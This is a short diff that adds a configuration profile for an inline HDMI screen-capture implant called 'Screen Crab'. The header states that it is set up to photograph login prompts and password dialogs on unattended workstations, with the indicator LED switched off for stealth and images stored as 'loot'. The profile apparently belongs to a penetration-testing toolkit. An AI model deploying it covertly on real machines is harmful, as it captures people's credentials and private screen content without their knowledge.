@@ -1,0 +1,19 @@
+# ================================================================
+#  Screen Crab Config : motion-login
+#  Use case           : Unattended workstation / login screen capture.
+#                       High sensitivity catches any screen change —
+#                       login prompts, screen unlocks, password dialogs.
+#                       Quality maximised for OCR legibility.
+#  LED                : OFF (stealth — no indicator light visible)
+#  Deploy             : Inline between source device and display.
+#                       Both HDMI ports must have active link.
+# ================================================================
+
+TRIGGER=MOTION
+CAPTURE=IMAGE
+QUALITY=92
+RESOLUTION=NATIVE
+SENSITIVITY=8
+LED=OFF
+LOOT_DIR=loot/motion-login
+MAX_STORAGE=8192
